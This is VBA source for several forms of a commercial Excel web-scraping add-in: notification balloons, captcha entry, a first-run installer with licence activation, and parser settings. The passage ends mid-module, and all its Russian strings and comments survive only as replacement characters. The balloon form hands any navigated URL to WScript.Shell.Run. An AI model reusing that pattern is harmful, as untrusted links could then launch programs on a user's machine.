'---------------------------------------------------------------------------------------
' Module        : F_Balloon
' Author        : EducatedFool                     Date: 18.01.2015
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/                     Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Public Items As New Collection
Public BaseURL As String

Private Sub Browser_BeforeNavigate2(ByVal pDisp As Object, URL As Variant, flags As Variant, TargetFrameName As Variant, PostData As Variant, headers As Variant, Cancel As Boolean)
    On Error Resume Next
    If URL Like "*balloon.html" Then Exit Sub

    Cancel = True
    CreateObject("wscript.shell").Run URL
End Sub

Private Sub Browser_DocumentComplete(ByVal pDisp As Object, URL As Variant)
    On Error Resume Next
    If Not SETT.GetBoolean("CheckBox_ScrollBalloonWindow") Then Browser.document.body.Scroll = "no"
    Browser.document.body.Style.Border = "none"
End Sub

Private Sub CommandButton1_Click()
    On Error Resume Next
    Unload Me
End Sub

Sub DisplayAllItems()
    On Error Resume Next
    Dim item As Variant, htxt$, FormHeight&, MaxBalloons&, TimeStamp As Double
    MaxBalloons& = SETT.GetNumber("ComboBox_MaxBalloons")
    If MaxBalloons& < 10 Then MaxBalloons& = 10

    While Me.Items.Count > MaxBalloons&
        Me.Items.Remove 1
    Wend
    For Each item In Me.Items
        htxt$ = htxt$ & IIf(Len(htxt$) = 0, "", "<hr>") & item
    Next

    With Me.Browser
        Me.BaseURL = CreateHTMLfromTemplate(htxt$)
        .Navigate Me.BaseURL
        TimeStamp = Timer
        Do While (.Busy = True) Or (.readyState <> READYSTATE_COMPLETE)
            DoEvents
            If Abs(Timer - TimeStamp) >= 2 Then Exit Do
        Loop
        'Debug.Print Me.Items.Count, .document.body.ClientHeight, Application.Height - 140, "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & Application.Min(.document.body.ClientHeight, Application.Height - 140)

        .Height = Application.min(.document.body.ClientHeight, Application.Height - 140)
        FormHeight& = .Height * 0.78 + 25
        'FormHeight& = .Height + 35
        FormHeight& = Application.min(FormHeight&, Application.Height - 60)
        'Debug.Print "form calculated = " & Me.Height, "form before = " & FormHeight&, "form after = " & IIf(Me.Height < FormHeight&, FormHeight&, Me.Height)
        If Me.Height < FormHeight& Then Me.Height = FormHeight&    ': Debug.Print "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| " & FormHeight&
        If .Height > Me.Height - 25 Then .Height = Me.Height - 25    ': Debug.Print "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| " & Me.Height - 25
        'Debug.Print "new browser H = " & .Height
        'Debug.Print
        SetPosition

        sHeight& = .document.body.ScrollHeight        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        .document.parentWindow.scrollTo 0, sHeight&        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        
        TimeStamp = Timer
        Do While (.Busy = True) Or (.readyState <> READYSTATE_COMPLETE)
            DoEvents
            If Abs(Timer - TimeStamp) >= 2 Then Exit Do
        Loop
    End With
End Sub

Private Sub UserForm_Initialize()
    On Error Resume Next
    SetPosition


    'ShowTitleBar F_Balloon, True

    '    SetFormOpacity Me, 200
    '    MakeFormResizable Me

    'ShowWindow HWndOfUserForm(Me), 5
End Sub

Sub SetPosition()
    On Error Resume Next
    With Me
        .Left = Application.Width + Application.Left - .Width - 8
        .Top = Application.Height + Application.Top - .Height - 6
    End With
End Sub

Sub UserForm_Resize()
    On Error Resume Next: Dim BrowserHeight&
    With Me.Browser
        .Width = Me.Width - 15
        .Height = Me.Height - 50
        BrowserHeight& = .document.body.ClientHeight * 0.78 + 5
        .Height = IIf(BrowserHeight& < Application.Height - 50, BrowserHeight&, Application.Height - 50)
    End With
End Sub
Attribute VB_Name = "F_Captcha"
Attribute VB_Base = "0{B5B553DF-0F4A-45C0-9F37-BF137AE5BBAA}{930B0C2A-72C6-4DD2-BA3C-5E822D6FF670}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Module        : F_Captcha
' Author        : EducatedFool                     Date: 04.08.2014
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/                     Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit

Sub SetSize(ByVal Size$)
    On Error Resume Next
    Const minW_form& = 234, minH_form& = 134, minW_browser& = 216, minH_browser& = 72, auto_padding& = 3
    Dim H&, w&
    Select Case Size$
        Case "default", ""       ' do nothing
        Case "auto"
            H& = Browser.document.body.ClientHeight + auto_padding&
            w& = Browser.document.body.ClientWidth + auto_padding&
            If H < minH_browser& Then H = minH_browser&
            If w < minW_browser& Then w = minW_browser&
        Case Else
            If Size$ Like "#*#:#*#" Then
                w& = Val(Split(Size$, ":")(0))
                H& = Val(Split(Size$, ":")(1))
                If w <= 0 And H <= 0 Then Exit Sub
                Browser.document.body.Scroll = "no"
                Browser.document.body.Style.Border = "none"
            End If
    End Select

    If w > minW_browser& Then
        Browser.Width = w
        Me.Width = minW_form& + w - minW_browser&
        Me.CommandButton_OK.Left = 144 + w - minW_browser&
        Me.TextBox_Captcha.Width = 125 + w - minW_browser&
    End If
    If H > minH_browser& Then
        Browser.Height = H
        Me.Height = minH_form& + H - minH_browser&
        Me.CommandButton_OK.Top = 84 + H - minH_browser&
        Me.TextBox_Captcha.Top = 84 + H - minH_browser&
    End If
End Sub

Private Sub Browser_DocumentComplete(ByVal pDisp As Object, URL As Variant)
    On Error Resume Next
    Browser.document.body.Scroll = "no"
    Browser.document.body.Style.Border = "none"
End Sub

Private Sub CommandButton_OK_Click()
    Me.Hide
End Sub

Private Sub CommandButton1_Click()
    On Error Resume Next
    Unload Me
End Sub

'Private Sub TextBox_Captcha_Exit(ByVal Cancel As MSForms.ReturnBoolean)
'    On Error Resume Next
'    If Len(Me.TextBox_Captcha) Then Me.Hide
'End Sub

Private Sub UserForm_Initialize()
    On Error Resume Next
    Me.TextBox_Captcha.SetFocus
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
    'x = ActivateKeyboardLayout&(kb_lay_ru, 0)
End Sub
Attribute VB_Name = "F_FirstRun"
Attribute VB_Base = "0{3E2A03DC-AB0E-4036-AC69-B6FB6FE235D7}{DB69F9F7-C8C3-4CDD-AD87-4A537F174DC4}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Module        : F_FirstRun                    Version: 2.1
' Author        : Igor Vakhnenko                   Date: 01.11.2016
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit: Option Compare Text

Private Sub ComboBox_Language_Change()
    On Error Resume Next
    If SetLanguage(Me.ComboBox_Language) Then
        TranslateUserForm Me
        MultiPage_FirstRun_Change
        UpdateFields
    End If
End Sub

Private Sub CommandButton_Cancel_Click()
    Unload Me
End Sub

Sub UpdateFields()
    On Error Resume Next
    Me.TextBox_EULA.text = tt("EULA content", "ExcelVBA.ru", ProgramYears)
    Me.TextBox_EULA.SelStart = 0
    Me.TextBox_EULA.SelLength = 0
    Me.Caption = tt("FirstRun_FormCaption")
    Me.Label_ProgramFullname = tt("ProgramFullname")
End Sub

Private Sub CommandButton_Action1_Click()
    On Error Resume Next: Me.MultiPage_FirstRun.value = Me.MultiPage_FirstRun.value - 1
End Sub

Sub InstallAddinToFolder(ByVal Folder$)
    On Error Resume Next
    If ThisWorkbook.Path = Folder$ Then Exit Sub
    If Not FWF.FolderExists(Folder$) Then Exit Sub
    Dim FileName$, coll As Collection, file, WB As Workbook

    ' deleting old add-in versions from destination folder
    Set coll = FWF.FilenamesCollection(Folder$, PROJECT_NAME$ & "*." & FWF.GetFileExtension(ThisWorkbook.FullName), 1)
    For Each file In coll
        FileName$ = Dir(file)
        If FileName$ <> ThisWorkbook.Name Then
            Set WB = Nothing: Set WB = Workbooks(FileName$)
            If Not WB Is Nothing Then WB.Close False
        End If
        SetAttr file, vbNormal
        Kill file
    Next

    FileName$ = Folder$ & Application.PathSeparator & PROJECT_NAME$ & "." & FWF.GetFileExtension(ThisWorkbook.FullName)
    Application.DisplayAlerts = False
    ThisWorkbook.SaveAs FileName$
    Application.DisplayAlerts = True
    Set coll = Nothing: Set WB = Nothing
End Sub

Private Sub CommandButton_Action2_Click()
    On Error Resume Next: Dim email$, i As Boolean
    If Me.MultiPage_FirstRun.value = Me.MultiPage_FirstRun.Pages.Count - 1 Then
        With SETT
            InstallAddinToFolder Me.Label_DestinationFolder
            AddinAutoRun Me.CheckBox_Autorun.value
            i = .RSP(3) = ""
            If Me.CheckBox_AddShortcut Then CreateShortcutInStartMenu
            HWID True
            email$ = Trim(Me.TextBox_ActivationCode)
            If .RSP(1) = "" Then .WSP 1, .DTU
            If Not Request_("action=first_run activation", "data=" & email$) Then
                If Len(email$) Then MsgBox tt("|46415F4143545F436F6E6E6563744572726F72"), vbCritical, PROJECT_NAME$
                If i Then .WSP 3, (.LastMacro + 1) * l0 + .LastMacro
            End If
        End With
        SetupCancelled = False
        Unload Me
    End If
    Me.MultiPage_FirstRun.value = Me.MultiPage_FirstRun.value + 1
End Sub
Private Sub CommandButton_Action3_Click()
    SetupCancelled = True
    Unload Me
End Sub

Private Sub CommandButton_ChangeFolder_Click()
    On Error Resume Next: Dim Folder$
    Folder$ = FWF.GetFolderPath(, Me.Label_DestinationFolder)
    If Folder$ <> "" Then
        If Right(Folder$, 1) = Application.PathSeparator Then Folder$ = Left(Folder$, Len(Folder$) - 1)
        Me.Label_DestinationFolder = Folder$
    End If
End Sub

Private Sub Image_en_Click(): On Error Resume Next: Me.ComboBox_Language = "en": End Sub
Private Sub Image_ru_Click(): On Error Resume Next: Me.ComboBox_Language = "ru": End Sub
Private Sub Image_it_Click(): On Error Resume Next: Me.ComboBox_Language = "it": End Sub
Private Sub Image_de_Click(): On Error Resume Next: Me.ComboBox_Language = "de": End Sub
Private Sub Image_fr_Click(): On Error Resume Next: Me.ComboBox_Language = "fr": End Sub
Private Sub Image_es_Click(): On Error Resume Next: Me.ComboBox_Language = "es": End Sub
Private Sub Image_ar_Click(): On Error Resume Next: Me.ComboBox_Language = "ar": End Sub
Private Sub Image_jp_Click(): On Error Resume Next: Me.ComboBox_Language = "jp": End Sub

Sub MultiPage_FirstRun_Change()
    On Error Resume Next
    Dim arrButtonsCaption As Variant, param$, b_capt$, b_en As Boolean, b_vis As Boolean, i&
    arrButtonsCaption = Split(Me.MultiPage_FirstRun.Pages(Me.MultiPage_FirstRun.value).Tag, "/")
    For i = 1 To 3
        param$ = "": param$ = arrButtonsCaption(i - 1)
        b_capt$ = Replace(param$, "*", "")
        b_en = InStr(1, param$, "*") = 0
        b_vis = b_capt$ <> ""

        With Me.Controls("CommandButton_Action" & i)
            .Caption = tt(b_capt$)
            .Enabled = b_en
            .Visible = b_vis
        End With
    Next
    Me.CommandButton_Action2.SetFocus
End Sub

Private Sub TextBox_ActivationCode_KeyPress(ByVal KeyAscii As MSForms.ReturnInteger)
    Me.CommandButton_Action1.TabIndex = 5
End Sub

Function GetDestinationFolder() As String
    On Error Resume Next: Dim Folder$, downloads_folder$, changed As Boolean, v
    Const USF$ = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders\"
    downloads_folder$ = Replace(SETT.GetText("{374DE290-123F-4565-9164-39C4925E467B}", , USF$), "%USERPROFILE%", Environ("USERPROFILE"))
    Folder$ = ThisWorkbook.Path
    For Each v In Array(downloads_folder$, "Downloads", SETT.U("C7E0E3F0F3E7EAE8"))
        If InStr(1, Folder$, v, vbTextCompare) Then changed = True: Exit For
    Next
    GetDestinationFolder = IIf(changed, CreateObject("WScript.Shell").SpecialFolders("Desktop"), Folder$)
End Function

Private Sub UserForm_Initialize()
    On Error Resume Next: Dim i&, j&, larr, ctrl As Object, picpath$, LangImagesCount&
    SetupCancelled = True
    Me.Caption = PROJECT_NAME$
    If SETT.IsSettingBlank("Setup\Language") Then SetLanguage SYSTEM_LANGUAGE
    'If TrueDeveloper Then Me.MultiPage_FirstRun.Pages("Page4_Done").Tag = "Back/Done/"

    picpath$ = GetFile_MainPicture
    If picpath$ <> "" Then Set Me.Image_Main.Picture = LoadPicture(picpath$)

    TranslateUserForm Me
    UpdateFields

    Me.MultiPage_FirstRun.Style = fmTabStyleNone
    Me.MultiPage_FirstRun.value = 0
    MultiPage_FirstRun_Change

    larr = AvailableLanguagesArray
    Me.ComboBox_Language.list = larr
    Me.ComboBox_Language = GetLanguage
    If Me.ComboBox_Language.ListIndex = -1 Then Me.ComboBox_Language.ListIndex = 0
    If Me.ComboBox_Language.ListCount = 1 Then
        Me.MultiPage_FirstRun.value = 1
        Me.CommandButton_Action1.Visible = False
        Me.CommandButton_Action2.SetFocus
    End If

    For i = LBound(larr) To UBound(larr)
        If LangImagesCount& > 5 Then Exit For
        Set ctrl = Nothing: Set ctrl = Me.Controls("Image_" & larr(i, 1))
        If Not ctrl Is Nothing Then
            ctrl.ControlTipText = larr(i, 2)
            LangImagesCount& = LangImagesCount& + 1
            ctrl.Top = Me.ComboBox_Language.Top + 1
            ctrl.Left = Me.ComboBox_Language.Left + Me.ComboBox_Language.Width + 40 + (LangImagesCount& - 1) * 33
            ctrl.Visible = True
        End If
    Next i
    Me.Label_DestinationFolder.Caption = Me.GetDestinationFolder
End Sub

Private Sub UserForm_QueryClose(Cancel As Integer, CloseMode As Integer)
    On Error Resume Next
    If CloseMode = 0 And Not TrueDeveloper Then Cancel = True
End Sub

Attribute VB_Name = "F_ParserSettings_Add"
Attribute VB_Base = "0{5BE6C6C5-30AC-45C4-B61A-A9826E4DA0A0}{F692549F-90FF-431C-8B93-BF020C95CCAC}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Module        : F_ParserSettings_Add
' Author        : Igor Vakhnenko            Date: 17.11.2013
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/                     Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------
Option Explicit
Option Compare Text

Private Sub ComboBox_ExistingParserName_Change()
    Me.CommandButton_CloneParser.Enabled = Trim(Me.ComboBox_ExistingParserName) <> ""
    Me.Image_DeleteParser.Visible = Trim(Me.ComboBox_ExistingParserName) <> ""
End Sub

Private Sub CommandButton_AddParserFromXMLfile_Click()
    CreatedParserFilename$ = Me.TextBox_XMLforImportParser.Tag
    ' ND "price config", "load WebsiteParser from XML file: " & Dir(CreatedParserFilename$)
    Unload Me
End Sub

Private Sub CommandButton_Cancel_Click()
    Unload Me
End Sub

Private Sub CommandButton_CreateNewParser_Click()
    On Error Resume Next
    Dim NewFile$, msg$
    NewFile$ = PARSERS_FOLDER$ & Trim(Replace(CleanNewParserName(Me.TextBox_NewParserName), PARSER_EXT$, "")) & PARSER_EXT$
    If Dir(NewFile$, vbNormal) <> "" Then
        msg = "|fffd||fffd||fffd||fffd| " & Dir(NewFile$) & " |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|" & vbNewLine & _
              PARSERS_FOLDER$ & vbNewLine & vbNewLine & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|?"
        If MsgBox(msg, vbQuestion + vbYesNo + vbDefaultButton2, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|") = vbNo Then Exit Sub
    End If

    SaveTXTfile NewFile$, ""
    CreatedParserFilename$ = NewFile$
    Unload Me
End Sub

Private Sub CommandButton_DownloadParser_Click()
    On Error Resume Next
    Dim WebConf$, LocalConf$, msg$
    WebConf$ = DEVELOPER_WEBSITE$ & WEB_PARSERS_FOLDER$ & "/" & Me.ComboBox_ServerParserName & PARSER_EXT$
    LocalConf$ = PARSERS_FOLDER$ & Me.ComboBox_ServerParserName & PARSER_EXT$

    If Dir(LocalConf$, vbNormal) <> "" Then
        msg = "|fffd||fffd||fffd||fffd| " & Dir(LocalConf$) & " |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|" & vbNewLine & _
              PARSERS_FOLDER$ & vbNewLine & vbNewLine & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|?"
        If MsgBox(msg, vbQuestion + vbYesNo + vbDefaultButton2, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|") = vbNo Then Exit Sub
    End If

    ' ND "price config", "try download WebsiteParser: " & Me.ComboBox_ServerParserName
    If FWF.DownLoadFileFromURL(WebConf$, LocalConf$) Then
        CreatedParserFilename$ = LocalConf$
        ' ND "price config", "Done: download WebsiteParser: " & Me.ComboBox_ServerParserName
        Unload Me
    Else
        MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & Me.ComboBox_ServerParserName & "|fffd|"
        Debug.Print WebConf$
        Debug.Print LocalConf$
        ' ND "price config", "Error downloading WebsiteParser: " & Me.ComboBox_ServerParserName
    End If
End Sub

Private Sub CommandButton_ExtendForm_Click()
    On Error Resume Next
    ExtendOrCollapseForm Me.CommandButton_ExtendForm
    Me.Hide: Me.Show
End Sub

Private Sub CommandButton_CloneParser_Click()
    MsgBox "|fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|": Exit Sub
    If Dir(PARSERS_FOLDER$ & Me.ComboBox_ExistingParserName & PARSER_EXT$, vbNormal) = "" Then Exit Sub
    CreatedParserFilename$ = PARSERS_FOLDER$ & Me.ComboBox_ExistingParserName & PARSER_EXT$
    ' ND "price config", "select existing WebsiteParser: " & Me.ComboBox_ExistingParserName
    Unload Me
End Sub

Private Sub CommandButton_OnlineHelp_Click(): OnlineHelp Me.CommandButton_OnlineHelp.Tag, Me.Name: End Sub

Private Sub CommandButton_OrderConfig_Click()
    On Error Resume Next
    MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
           "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| , " & vbNewLine & _
           "Skype: ExcelVBA.ru, |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|: order@ExcelVBA.ru", vbInformation, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    ' ND "price config", "order for WebsiteParser: error msg"
End Sub

Private Sub CommandButton_SelectParserFileForImport_Click()
    On Error Resume Next
    Dim FileName$, msg$
    FileName$ = GetFilePath("|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", ThisWorkbook.Path, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "*" & PARSER_EXT$)        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
    If FileName$ = "" Then Exit Sub        ' |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
    If Not FileName$ Like "*" & PARSER_EXT$ Then MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", vbExclamation, _
       "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|": Exit Sub        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|

    If FileName$ = PARSERS_FOLDER$ & Dir(FileName$) Then        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|-|fffd||fffd||fffd||fffd|
        'CreatedParserFilename$ = filename$: Exit Sub
    Else
        On Error Resume Next: Err.Clear
        If Dir(PARSERS_FOLDER$ & Dir(FileName$), vbNormal) <> "" Then
            msg = "|fffd||fffd||fffd||fffd| " & Dir(FileName$) & " |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|" & vbNewLine & _
                  PARSERS_FOLDER$ & vbNewLine & vbNewLine & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|?"
            If MsgBox(msg, vbQuestion + vbYesNo + vbDefaultButton2, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|") = vbNo Then Exit Sub
        End If
        FileCopy FileName$, PARSERS_FOLDER$ & Dir(FileName$)
    End If

    If Err = 0 Then
        Me.TextBox_XMLforImportParser = Replace(Dir(FileName$), PARSER_EXT$, "")
        Me.TextBox_XMLforImportParser.Tag = PARSERS_FOLDER$ & Dir(FileName$)
    Else
        'MsgBox Err.Description
    End If
End Sub


Private Sub Image_DeleteParser_Click()
    On Error Resume Next
    Dim coll As Collection, ParserFilename$, item
    If Dir(PARSERS_FOLDER$ & Me.ComboBox_ExistingParserName & PARSER_EXT$, vbNormal) = "" Then Exit Sub
    ParserFilename$ = PARSERS_FOLDER$ & Me.ComboBox_ExistingParserName & PARSER_EXT$
    AllParsers.AddFromXML(ParserFilename$).Delete

    Me.ComboBox_ExistingParserName.Clear
    Set coll = FilenamesCollection(PARSERS_FOLDER$, "*" & PARSER_EXT$, 1)
    For Each item In coll: Me.ComboBox_ExistingParserName.AddItem Replace(Dir(item), PARSER_EXT$, ""): Next
    'Me.ComboBox_ExistingParserName.ListIndex = 0    ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
End Sub

Private Sub Label_Help_ParserOrder_Click()
    On Error Resume Next
    CreateObject("wscript.shell").Run "http://excelvba.ru/programmes/Parser/order"
End Sub

Private Sub Label_OpenParsersFolder_Click()
    On Error Resume Next: OpenFolder PARSERS_FOLDER$
End Sub

Private Sub TextBox_NewParserName_Change()
    On Error Resume Next
    If Me.TextBox_NewParserName <> CleanNewParserName(Me.TextBox_NewParserName) Then Me.TextBox_NewParserName = CleanNewParserName(Me.TextBox_NewParserName)
    Me.CommandButton_CreateNewParser.Enabled = Trim(Me.TextBox_NewParserName) <> ""
End Sub
Private Sub ComboBox_ServerParserName_Change()
    Me.CommandButton_DownloadParser.Enabled = Trim(Me.ComboBox_ServerParserName) <> ""
End Sub
Private Sub TextBox_XMLforImportParser_Change()
    Me.TextBox_XMLforImportParser.BackColor = vbWindowBackground
    Me.CommandButton_AddParserFromXMLfile.Enabled = Trim(Me.TextBox_XMLforImportParser) <> ""
End Sub


Private Sub UserForm_Initialize()
    On Error Resume Next
    ExtendOrCollapseForm Me.CommandButton_ExtendForm
    Dim coll As Collection, item
    Set coll = FilenamesCollection(PARSERS_FOLDER$, "*" & PARSER_EXT$, 1)
    For Each item In coll: Me.ComboBox_ExistingParserName.AddItem Replace(Dir(item), PARSER_EXT$, ""): Next
    'Me.ComboBox_ExistingParserName.ListIndex = 0    ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    ApplyZoomTo Me
    If SETT.GetNumber("ComboBox_Zoom", 100) <> 100 Then Me.CommandButton_ExtendForm.Visible = False
End Sub

Private Sub UserForm_QueryClose(Cancel As Integer, CloseMode As Integer)
    ' UpdateAddinToolbar
End Sub
Attribute VB_Name = "F_ParserSettings_Edit"
Attribute VB_Base = "0{37597ED3-C1A3-4D27-ACCA-730A50BCA1FA}{F5FA7DCF-B608-476D-A1E7-1ACAD1384A2F}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Module        : F_ParserSettings_Edit                    Version:
' Author        : Igor Vakhnenko                   Date: 23.09.2015
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit
Option Compare Text
Public ActiveParser As WebsiteParser, SpecialControlsCollection As Collection, StopEvents As Boolean
Public ActiveColumn As OutputColumn, ActiveDownload As ParserDownload, ActiveActionSet As ActionSet, ActiveActionSetID$, ActiveMacro As ParserMacro

Private Sub CheckBox_AutoRemoveIFrames_Click()
    Me.ActiveParser.Options.RemoveIFrames = Me.CheckBox_AutoRemoveIFrames
End Sub

Private Sub CheckBox_AutoRemoveScripts_Click()
    Me.ActiveParser.Options.RemoveScripts = Me.CheckBox_AutoRemoveScripts
End Sub

Private Sub CheckBox_CaptchaEnabled_Click()
    On Error Resume Next: Me.ActiveParser.Options.CaptchaEnabled = Me.CheckBox_CaptchaEnabled
End Sub

Private Sub CheckBox_CaptchaReloadPage_Click()
    On Error Resume Next: Me.ActiveParser.Options.CaptchaReloadPage = Me.CheckBox_CaptchaReloadPage
End Sub

Private Sub CheckBox_CaptchaShowPopup_Click()
    On Error Resume Next: Me.ActiveParser.Options.CaptchaShowPopup = Me.CheckBox_CaptchaShowPopup
End Sub

Private Sub CheckBox_ClearDictionaries_Click()
    Me.ActiveParser.Options.ClearDictionaries = Me.CheckBox_ClearDictionaries
End Sub

Private Sub CheckBox_ClientCertificate_Change()
    On Error Resume Next: Me.ActiveParser.Options.UseClientCertificate = Me.CheckBox_ClientCertificate
End Sub

Private Sub CheckBox_ClientCertificate_Click()
    On Error Resume Next: Me.TextBox_ClientCertificate.Enabled = Me.CheckBox_ClientCertificate
End Sub

Private Sub CheckBox_ColumnAutoOrder_Click()
    On Error Resume Next
